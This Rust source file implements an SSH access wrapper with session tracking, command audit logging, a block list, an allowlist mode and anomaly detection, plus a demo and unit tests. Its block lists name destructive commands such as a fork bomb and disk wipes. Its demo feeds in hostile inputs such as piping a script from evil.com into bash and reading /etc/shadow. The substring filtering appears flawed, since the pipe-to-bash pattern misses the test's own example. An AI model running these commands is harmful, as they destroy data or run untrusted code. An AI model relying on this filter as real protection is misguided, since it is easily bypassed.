//! SSH Access Logger and Wrapper
//!
//! Secure SSH wrapper with comprehensive logging:
//! - Command execution logging
//! - Session recording
//! - Access control policies
//! - Anomaly detection
//! - Audit trail generation

use std::collections::{HashMap, HashSet};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

// ============================================================================
// Configuration
// ============================================================================

/// SSH wrapper configuration
#[derive(Debug, Clone)]
pub struct SshWrapperConfig {
    /// Enable command logging
    pub log_commands: bool,
    /// Enable session recording
    pub record_sessions: bool,
    /// Maximum session duration
    pub max_session_duration: Duration,
    /// Allowed commands (if set, only these are allowed)
    pub allowed_commands: Option<HashSet<String>>,
    /// Blocked commands (always denied)
    pub blocked_commands: HashSet<String>,
    /// Enable anomaly detection
    pub detect_anomalies: bool,
    /// Log directory
    pub log_dir: String,
}

impl Default for SshWrapperConfig {
    fn default() -> Self {
        let mut blocked = HashSet::new();
        // Block dangerous commands by default
        for cmd in [
            "rm -rf /",
            "dd if=/dev/zero",
            ":(){ :|:& };:",
            "mkfs",
            "fdisk",
            "> /dev/sda",
        ] {
            blocked.insert(cmd.to_string());
        }

        Self {
            log_commands: true,
            record_sessions: true,
            max_session_duration: Duration::from_secs(8 * 3600), // 8 hours
            allowed_commands: None,                              // Allow all by default
            blocked_commands: blocked,
            detect_anomalies: true,
            log_dir: "/var/log/ssh-wrapper".to_string(),
        }
    }
}

impl SshWrapperConfig {
    /// Create restrictive config (allowlist mode)
    pub fn restrictive() -> Self {
        let mut allowed = HashSet::new();
        for cmd in [
            "ls", "cat", "grep", "find", "tail", "head", "less", "ps", "top", "df", "du", "free",
            "uptime", "whoami", "pwd", "cd", "echo", "date", "hostname",
        ] {
            allowed.insert(cmd.to_string());
        }

        Self {
            allowed_commands: Some(allowed),
            ..Default::default()
        }
    }
}

// ============================================================================
// Session Management
// ============================================================================

/// SSH session information
#[derive(Debug, Clone)]
pub struct Session {
    pub id: String,
    pub user: String,
    pub remote_ip: String,
    pub started_at: Instant,
    pub last_activity: Instant,
    pub commands_executed: u32,
    pub bytes_transferred: u64,
    pub status: SessionStatus,
}

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum SessionStatus {
    Active,
    Idle,
    Terminated,
    TimedOut,
    Blocked,
}

impl Session {
    pub fn new(user: &str, remote_ip: &str) -> Self {
        let now = Instant::now();
        Self {
            id: generate_session_id(),
            user: user.to_string(),
            remote_ip: remote_ip.to_string(),
            started_at: now,
            last_activity: now,
            commands_executed: 0,
            bytes_transferred: 0,
            status: SessionStatus::Active,
        }
    }

    pub fn duration(&self) -> Duration {
        self.started_at.elapsed()
    }

    pub fn idle_time(&self) -> Duration {
        self.last_activity.elapsed()
    }

    pub fn touch(&mut self) {
        self.last_activity = Instant::now();
    }
}

/// Session manager
pub struct SessionManager {
    sessions: Mutex<HashMap<String, Session>>,
    config: SshWrapperConfig,
}

impl SessionManager {
    pub fn new(config: SshWrapperConfig) -> Self {
        Self {
            sessions: Mutex::new(HashMap::new()),
            config,
        }
    }

    /// Create a new session
    pub fn create_session(&self, user: &str, remote_ip: &str) -> Result<Session, SessionError> {
        let session = Session::new(user, remote_ip);
        let mut sessions = self.sessions.lock().unwrap();

        // Check for max sessions per user
        let user_sessions = sessions
            .values()
            .filter(|s| s.user == user && s.status == SessionStatus::Active)
            .count();

        if user_sessions >= 5 {
            return Err(SessionError::MaxSessionsExceeded(user.to_string()));
        }

        sessions.insert(session.id.clone(), session.clone());
        Ok(session)
    }

    /// Get session by ID
    pub fn get_session(&self, session_id: &str) -> Option<Session> {
        self.sessions.lock().unwrap().get(session_id).cloned()
    }

    /// Update session activity
    pub fn touch_session(&self, session_id: &str) {
        if let Some(session) = self.sessions.lock().unwrap().get_mut(session_id) {
            session.touch();
        }
    }

    /// Terminate session
    pub fn terminate_session(&self, session_id: &str, reason: SessionStatus) {
        if let Some(session) = self.sessions.lock().unwrap().get_mut(session_id) {
            session.status = reason;
        }
    }

    /// Get all active sessions
    pub fn active_sessions(&self) -> Vec<Session> {
        self.sessions
            .lock()
            .unwrap()
            .values()
            .filter(|s| s.status == SessionStatus::Active)
            .cloned()
            .collect()
    }

    /// Check for timed out sessions
    pub fn check_timeouts(&self) -> Vec<String> {
        let mut timed_out = Vec::new();
        let mut sessions = self.sessions.lock().unwrap();

        for (id, session) in sessions.iter_mut() {
            if session.status == SessionStatus::Active
                && session.duration() > self.config.max_session_duration
            {
                session.status = SessionStatus::TimedOut;
                timed_out.push(id.clone());
            }
        }

        timed_out
    }
}

#[derive(Debug)]
pub enum SessionError {
    MaxSessionsExceeded(String),
    SessionNotFound(String),
    SessionExpired(String),
}

impl std::fmt::Display for SessionError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::MaxSessionsExceeded(user) => {
                write!(f, "Maximum sessions exceeded for user: {}", user)
            }
            Self::SessionNotFound(id) => write!(f, "Session not found: {}", id),
            Self::SessionExpired(id) => write!(f, "Session expired: {}", id),
        }
    }
}

// ============================================================================
// Command Logging
// ============================================================================

/// Command log entry
#[derive(Debug, Clone)]
pub struct CommandLog {
    pub timestamp: u64,
    pub session_id: String,
    pub user: String,
    pub remote_ip: String,
    pub command: String,
    pub working_dir: String,
    pub exit_code: Option<i32>,
    pub duration_ms: u64,
    pub blocked: bool,
    pub block_reason: Option<String>,
}

impl CommandLog {
    pub fn new(session: &Session, command: &str, working_dir: &str) -> Self {
        Self {
            timestamp: current_timestamp(),
            session_id: session.id.clone(),
            user: session.user.clone(),
            remote_ip: session.remote_ip.clone(),
            command: command.to_string(),
            working_dir: working_dir.to_string(),
            exit_code: None,
            duration_ms: 0,
            blocked: false,
            block_reason: None,
        }
    }

    pub fn to_json(&self) -> String {
        format!(
            r#"{{"timestamp":{},"session_id":"{}","user":"{}","remote_ip":"{}","command":"{}","working_dir":"{}","exit_code":{},"duration_ms":{},"blocked":{},"block_reason":{}}}"#,
            self.timestamp,
            escape_json(&self.session_id),
            escape_json(&self.user),
            escape_json(&self.remote_ip),
            escape_json(&self.command),
            escape_json(&self.working_dir),
            self.exit_code.map_or("null".to_string(), |c| c.to_string()),
            self.duration_ms,
            self.blocked,
            self.block_reason
                .as_ref()
                .map_or("null".to_string(), |r| format!(r#""{}""#, escape_json(r))),
        )
    }

    pub fn to_syslog(&self) -> String {
        format!(
            "SSH_AUDIT: user={} ip={} session={} cmd=\"{}\" exit={} duration={}ms blocked={}",
            self.user,
            self.remote_ip,
            self.session_id,
            self.command.chars().take(100).collect::<String>(),
            self.exit_code
                .map_or("pending".to_string(), |c| c.to_string()),
            self.duration_ms,
            self.blocked,
        )
    }
}

/// Command logger
pub struct CommandLogger {
    logs: Mutex<Vec<CommandLog>>,
    max_entries: usize,
}

impl CommandLogger {
    pub fn new(max_entries: usize) -> Self {
        Self {
            logs: Mutex::new(Vec::with_capacity(max_entries)),
            max_entries,
        }
    }

    pub fn log(&self, entry: CommandLog) {
        let mut logs = self.logs.lock().unwrap();
        if logs.len() >= self.max_entries {
            logs.remove(0);
        }

        // Print to stdout for demo (would write to file in production)
        println!("{}", entry.to_syslog());

        logs.push(entry);
    }

    pub fn recent(&self, count: usize) -> Vec<CommandLog> {
        self.logs
            .lock()
            .unwrap()
            .iter()
            .rev()
            .take(count)
            .cloned()
            .collect()
    }

    pub fn by_user(&self, user: &str) -> Vec<CommandLog> {
        self.logs
            .lock()
            .unwrap()
            .iter()
            .filter(|l| l.user == user)
            .cloned()
            .collect()
    }

    pub fn by_session(&self, session_id: &str) -> Vec<CommandLog> {
        self.logs
            .lock()
            .unwrap()
            .iter()
            .filter(|l| l.session_id == session_id)
            .cloned()
            .collect()
    }

    pub fn blocked_commands(&self) -> Vec<CommandLog> {
        self.logs
            .lock()
            .unwrap()
            .iter()
            .filter(|l| l.blocked)
            .cloned()
            .collect()
    }
}

// ============================================================================
// Access Control
// ============================================================================

/// Command access control
pub struct AccessControl {
    config: SshWrapperConfig,
}

impl AccessControl {
    pub fn new(config: SshWrapperConfig) -> Self {
        Self { config }
    }

    /// Check if command is allowed
    pub fn check_command(&self, command: &str) -> Result<(), AccessDenied> {
        let cmd_lower = command.to_lowercase();
        let first_word = command.split_whitespace().next().unwrap_or("");

        // Check blocked commands (exact match and pattern match)
        for blocked in &self.config.blocked_commands {
            if command.contains(blocked) || cmd_lower.contains(&blocked.to_lowercase()) {
                return Err(AccessDenied::BlockedCommand(blocked.clone()));
            }
        }

        // Check for dangerous patterns
        if self.is_dangerous_pattern(command) {
            return Err(AccessDenied::DangerousPattern(command.to_string()));
        }

        // Check allowlist if configured
        if let Some(ref allowed) = self.config.allowed_commands {
            if !allowed.contains(first_word) {
                return Err(AccessDenied::NotInAllowlist(first_word.to_string()));
            }
        }

        Ok(())
    }

    fn is_dangerous_pattern(&self, command: &str) -> bool {
        let dangerous_patterns = [
            "rm -rf",
            "rm -fr",
            "> /dev/sd",
            "dd if=/dev/zero",
            "chmod 777",
            "chmod -R 777",
            "curl | bash",
            "wget | bash",
            "curl | sh",
            "wget | sh",
            "/etc/passwd",
            "/etc/shadow",
            "history -c",
            "shred",
        ];

        let cmd_lower = command.to_lowercase();
        dangerous_patterns.iter().any(|p| cmd_lower.contains(p))
    }
}

#[derive(Debug)]
pub enum AccessDenied {
    BlockedCommand(String),
    DangerousPattern(String),
    NotInAllowlist(String),
}

impl std::fmt::Display for AccessDenied {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::BlockedCommand(cmd) => write!(f, "Command is blocked: {}", cmd),
            Self::DangerousPattern(pattern) => write!(f, "Dangerous pattern detected: {}", pattern),
            Self::NotInAllowlist(cmd) => write!(f, "Command not in allowlist: {}", cmd),
        }
    }
}

// ============================================================================
// Anomaly Detection
// ============================================================================

/// User behavior profile
#[derive(Debug, Clone, Default)]
pub struct UserProfile {
    pub typical_commands: HashMap<String, u32>,
    pub typical_hours: [u32; 24],
    pub typical_ips: HashSet<String>,
    pub average_commands_per_session: f64,
    pub session_count: u32,
}

/// Anomaly detector
pub struct AnomalyDetector {
    profiles: Mutex<HashMap<String, UserProfile>>,
    threshold: f64,
}

impl AnomalyDetector {
    pub fn new(threshold: f64) -> Self {
        Self {
            profiles: Mutex::new(HashMap::new()),
            threshold,
        }
    }

    /// Update user profile with new activity
    pub fn update_profile(&self, user: &str, command: &str, ip: &str) {
        let mut profiles = self.profiles.lock().unwrap();
        let profile = profiles.entry(user.to_string()).or_default();

        // Update command frequency
        let cmd_base = command.split_whitespace().next().unwrap_or("");
        *profile
            .typical_commands
            .entry(cmd_base.to_string())
            .or_default() += 1;

        // Update time of day
        let hour = (current_timestamp() / 3600 % 24) as usize;
        profile.typical_hours[hour] += 1;

        // Update known IPs
        profile.typical_ips.insert(ip.to_string());
    }

    /// Check for anomalies
    pub fn check(&self, user: &str, command: &str, ip: &str) -> Vec<Anomaly> {
        let profiles = self.profiles.lock().unwrap();
        let mut anomalies = Vec::new();

        if let Some(profile) = profiles.get(user) {
            // Check for unusual IP
            if !profile.typical_ips.is_empty() && !profile.typical_ips.contains(ip) {
                anomalies.push(Anomaly::UnusualIp {
                    ip: ip.to_string(),
                    known_ips: profile.typical_ips.iter().cloned().collect(),
                });
            }

            // Check for unusual command
            let cmd_base = command.split_whitespace().next().unwrap_or("");
            if !profile.typical_commands.is_empty()
                && !profile.typical_commands.contains_key(cmd_base)
            {
                anomalies.push(Anomaly::UnusualCommand {
                    command: cmd_base.to_string(),
                });
            }

            // Check for unusual hour
            let hour = (current_timestamp() / 3600 % 24) as usize;
            let total_activity: u32 = profile.typical_hours.iter().sum();
            if total_activity > 100 && profile.typical_hours[hour] == 0 {
                anomalies.push(Anomaly::UnusualTime { hour });
            }
        }

        anomalies
    }
}

#[derive(Debug, Clone)]
pub enum Anomaly {
    UnusualIp { ip: String, known_ips: Vec<String> },
    UnusualCommand { command: String },
    UnusualTime { hour: usize },
    RapidCommands { count: u32, duration_secs: u64 },
}

impl std::fmt::Display for Anomaly {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::UnusualIp { ip, known_ips } => {
                write!(f, "Unusual IP {} (known: {:?})", ip, known_ips)
            }
            Self::UnusualCommand { command } => {
                write!(f, "Unusual command: {}", command)
            }
            Self::UnusualTime { hour } => {
                write!(f, "Unusual activity at hour {}", hour)
            }
            Self::RapidCommands {
                count,
                duration_secs,
            } => {
                write!(f, "Rapid commands: {} in {}s", count, duration_secs)
            }
        }
    }
}

// ============================================================================
// SSH Wrapper (Main Component)
// ============================================================================

/// Complete SSH wrapper
pub struct SshWrapper {
    config: SshWrapperConfig,
    session_manager: Arc<SessionManager>,
    command_logger: Arc<CommandLogger>,
    access_control: AccessControl,
    anomaly_detector: Option<AnomalyDetector>,
}

impl SshWrapper {
    pub fn new(config: SshWrapperConfig) -> Self {
        let anomaly_detector = if config.detect_anomalies {
            Some(AnomalyDetector::new(0.8))
        } else {
            None
        };

        Self {
            session_manager: Arc::new(SessionManager::new(config.clone())),
            command_logger: Arc::new(CommandLogger::new(10000)),
            access_control: AccessControl::new(config.clone()),
            anomaly_detector,
            config,
        }
    }

    /// Start a new SSH session
    pub fn start_session(&self, user: &str, remote_ip: &str) -> Result<Session, SessionError> {
        let session = self.session_manager.create_session(user, remote_ip)?;

        println!(
            "SSH_SESSION_START: user={} ip={} session={}",
            user, remote_ip, session.id
        );

        Ok(session)
    }

    /// Execute a command with full security checks
    pub fn execute_command(
        &self,
        session_id: &str,
        command: &str,
        working_dir: &str,
    ) -> Result<CommandResult, CommandError> {
        // Get session
        let session = self
            .session_manager
            .get_session(session_id)
            .ok_or_else(|| CommandError::SessionNotFound(session_id.to_string()))?;

        if session.status != SessionStatus::Active {
            return Err(CommandError::SessionInactive(session.status));
        }

        // Create log entry
        let mut log = CommandLog::new(&session, command, working_dir);
        let start = Instant::now();

        // Check access control
        if let Err(denied) = self.access_control.check_command(command) {
            log.blocked = true;
            log.block_reason = Some(denied.to_string());
            log.duration_ms = start.elapsed().as_millis() as u64;
            self.command_logger.log(log);
            return Err(CommandError::AccessDenied(denied));
        }

        // Check for anomalies
        if let Some(ref detector) = self.anomaly_detector {
            let anomalies = detector.check(&session.user, command, &session.remote_ip);
            if !anomalies.is_empty() {
                for anomaly in &anomalies {
                    println!(
                        "SSH_ANOMALY: user={} session={} anomaly=\"{}\"",
                        session.user, session.id, anomaly
                    );
                }
            }
            // Update profile
            detector.update_profile(&session.user, command, &session.remote_ip);
        }

        // Simulate command execution
        let result = self.simulate_execute(command);

        // Update log
        log.exit_code = Some(result.exit_code);
        log.duration_ms = start.elapsed().as_millis() as u64;

        // Update session
        self.session_manager.touch_session(session_id);

        // Log command
        if self.config.log_commands {
            self.command_logger.log(log);
        }

        Ok(result)
    }

    fn simulate_execute(&self, _command: &str) -> CommandResult {
        // In production, this would actually execute the command
        CommandResult {
            exit_code: 0,
            stdout: "Command executed successfully".to_string(),
            stderr: String::new(),
        }
    }

    /// End a session
    pub fn end_session(&self, session_id: &str) {
        if let Some(session) = self.session_manager.get_session(session_id) {
            println!(
                "SSH_SESSION_END: user={} ip={} session={} duration={}s commands={}",
                session.user,
                session.remote_ip,
                session.id,
                session.duration().as_secs(),
                session.commands_executed,
            );
        }
        self.session_manager
            .terminate_session(session_id, SessionStatus::Terminated);
    }

    /// Get command logger
    pub fn logger(&self) -> Arc<CommandLogger> {
        Arc::clone(&self.command_logger)
    }

    /// Get session manager
    pub fn sessions(&self) -> Arc<SessionManager> {
        Arc::clone(&self.session_manager)
    }
}

#[derive(Debug)]
pub struct CommandResult {
    pub exit_code: i32,
    pub stdout: String,
    pub stderr: String,
}

#[derive(Debug)]
pub enum CommandError {
    SessionNotFound(String),
    SessionInactive(SessionStatus),
    AccessDenied(AccessDenied),
    ExecutionFailed(String),
}

impl std::fmt::Display for CommandError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::SessionNotFound(id) => write!(f, "Session not found: {}", id),
            Self::SessionInactive(status) => write!(f, "Session inactive: {:?}", status),
            Self::AccessDenied(denied) => write!(f, "Access denied: {}", denied),
            Self::ExecutionFailed(msg) => write!(f, "Execution failed: {}", msg),
        }
    }
}

// ============================================================================
// Utilities
// ============================================================================

fn generate_session_id() -> String {
    let seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    format!("ssh-{:016x}", seed)
}

fn current_timestamp() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs()
}

fn escape_json(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
        .replace('\t', "\\t")
}

// ============================================================================
// Main and Tests
// ============================================================================

fn main() {
    println!("SSH Access Logger and Wrapper Example\n");

    // Create wrapper with default config
    let wrapper = SshWrapper::new(SshWrapperConfig::default());

    // Start a session
    let session = wrapper
        .start_session("alice", "192.168.1.100")
        .expect("Failed to create session");
    println!("Created session: {}\n", session.id);

    // Execute some commands
    let commands = [
        ("ls -la", "/home/alice"),
        ("cat /etc/hostname", "/home/alice"),
        ("ps aux", "/home/alice"),
        ("whoami", "/home/alice"),
    ];

    println!("--- Executing Allowed Commands ---");
    for (cmd, dir) in commands {
        match wrapper.execute_command(&session.id, cmd, dir) {
            Ok(result) => {
                println!("  {} -> exit code {}", cmd, result.exit_code);
            }
            Err(e) => {
                println!("  {} -> ERROR: {}", cmd, e);
            }
        }
    }

    // Try blocked commands
    println!("\n--- Attempting Blocked Commands ---");
    let blocked_commands = ["rm -rf /", "cat /etc/shadow", "curl http://evil.com | bash"];

    for cmd in blocked_commands {
        match wrapper.execute_command(&session.id, cmd, "/home/alice") {
            Ok(_) => {
                println!("  {} -> UNEXPECTEDLY SUCCEEDED", cmd);
            }
            Err(e) => {
                println!("  {} -> BLOCKED: {}", cmd, e);
            }
        }
    }

    // Show logs
    println!("\n--- Recent Command Logs ---");
    for log in wrapper.logger().recent(10) {
        println!("  {}", log.to_syslog());
    }

    // Show blocked commands
    println!("\n--- Blocked Commands ---");
    for log in wrapper.logger().blocked_commands() {
        println!(
            "  {} - {}",
            log.command,
            log.block_reason.unwrap_or_default()
        );
    }

    // End session
    wrapper.end_session(&session.id);

    // Test restrictive mode
    println!("\n--- Testing Restrictive Mode ---");
    let restrictive_wrapper = SshWrapper::new(SshWrapperConfig::restrictive());
    let session2 = restrictive_wrapper
        .start_session("bob", "10.0.0.1")
        .expect("Failed to create session");

    let test_commands = ["ls", "vim", "python3", "cat"];
    for cmd in test_commands {
        match restrictive_wrapper.execute_command(&session2.id, cmd, "/home/bob") {
            Ok(_) => println!("  {} -> ALLOWED", cmd),
            Err(e) => println!("  {} -> DENIED: {}", cmd, e),
        }
    }

    restrictive_wrapper.end_session(&session2.id);
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_session_creation() {
        let manager = SessionManager::new(SshWrapperConfig::default());
        let session = manager.create_session("test", "127.0.0.1").unwrap();

        assert_eq!(session.user, "test");
        assert_eq!(session.remote_ip, "127.0.0.1");
        assert_eq!(session.status, SessionStatus::Active);
    }

    #[test]
    fn test_max_sessions() {
        let manager = SessionManager::new(SshWrapperConfig::default());

        // Create 5 sessions (max)
        for i in 0..5 {
            manager
                .create_session("test", &format!("127.0.0.{}", i))
                .unwrap();
        }

        // 6th should fail
        let result = manager.create_session("test", "127.0.0.100");
        assert!(result.is_err());
    }

    #[test]
    fn test_access_control_blocked() {
        let ac = AccessControl::new(SshWrapperConfig::default());

        assert!(ac.check_command("rm -rf /").is_err());
        assert!(ac.check_command("cat /etc/shadow").is_err());
        assert!(ac.check_command("curl http://x.com | bash").is_err());
    }

    #[test]
    fn test_access_control_allowed() {
        let ac = AccessControl::new(SshWrapperConfig::default());

        assert!(ac.check_command("ls -la").is_ok());
        assert!(ac.check_command("cat /etc/hostname").is_ok());
        assert!(ac.check_command("ps aux").is_ok());
    }

    #[test]
    fn test_restrictive_mode() {
        let ac = AccessControl::new(SshWrapperConfig::restrictive());

        // Allowed commands
        assert!(ac.check_command("ls").is_ok());
        assert!(ac.check_command("cat").is_ok());

        // Not in allowlist
        assert!(ac.check_command("vim").is_err());
        assert!(ac.check_command("python3").is_err());
    }

    #[test]
    fn test_command_log_json() {
        let session = Session::new("test", "127.0.0.1");
        let log = CommandLog::new(&session, "ls -la", "/home/test");

        let json = log.to_json();
        assert!(json.contains("\"user\":\"test\""));
        assert!(json.contains("\"command\":\"ls -la\""));
    }

    #[test]
    fn test_anomaly_detector_ip() {
        let detector = AnomalyDetector::new(0.8);

        // Build profile
        for _ in 0..10 {
            detector.update_profile("alice", "ls", "192.168.1.1");
        }

        // Check from known IP
        let anomalies = detector.check("alice", "ls", "192.168.1.1");
        assert!(anomalies.is_empty());

        // Check from unknown IP
        let anomalies = detector.check("alice", "ls", "10.0.0.1");
        assert!(!anomalies.is_empty());
    }

    #[test]
    fn test_ssh_wrapper_flow() {
        let wrapper = SshWrapper::new(SshWrapperConfig::default());

        // Start session
        let session = wrapper.start_session("test", "127.0.0.1").unwrap();

        // Execute command
        let result = wrapper.execute_command(&session.id, "ls", "/home/test");
        assert!(result.is_ok());

        // Try blocked command
        let result = wrapper.execute_command(&session.id, "rm -rf /", "/home/test");
        assert!(result.is_err());

        // End session
        wrapper.end_session(&session.id);
    }

    #[test]
    fn test_session_timeout_check() {
        let config = SshWrapperConfig {
            max_session_duration: Duration::from_millis(1),
            ..Default::default()
        };
        let manager = SessionManager::new(config);

        manager.create_session("test", "127.0.0.1").unwrap();
        std::thread::sleep(Duration::from_millis(10));

        let timed_out = manager.check_timeouts();
        assert!(!timed_out.is_empty());
    }
}
